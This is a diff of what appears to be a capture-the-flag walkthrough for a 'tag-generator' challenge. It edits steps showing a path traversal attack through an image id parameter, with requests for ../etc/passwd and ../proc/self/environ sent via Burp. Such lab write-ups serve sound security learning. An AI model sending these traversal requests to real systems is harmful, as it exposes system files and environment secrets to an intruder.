@@ -320,7 +320,8 @@ nginx/1.19.5
                     opacity: 1
 ~~~ 
 
-- Step 5: Didn't think I was getting anything with this, but I just needed to view the rreponse in Burp.	
+- Step 5: Didn't think I was getting anything with this, but I just needed to view the reponse in Burp.	
+
 ~~~
 https://tag-generator.kringlecastle.com/image?id=../etc/passwd
 
@@ -350,13 +351,8 @@ app:x:1000:1000:,,,:/home/app:/bin/bash
 
 ~~~
  
-- Step 6: Notice that "app" user
-- Step 7: Try this path again, but with LFI.
-~~~
-https://tag-generator.kringlecastle.com/image?id=../app/lib/app.rb
-~~~
-- Step 8: Review the code from app.rb.
-- Step 9: Google for how to get environment variables through LFI. Then try this request...in Burp:
+- Step 6: Do websearch for how to get environment variables through LFI. Then try this request...in Burp:
+
 ~~~
 GET /image?id=../proc/self/environ HTTP/1.1
 Host: tag-generator.kringlecastle.com
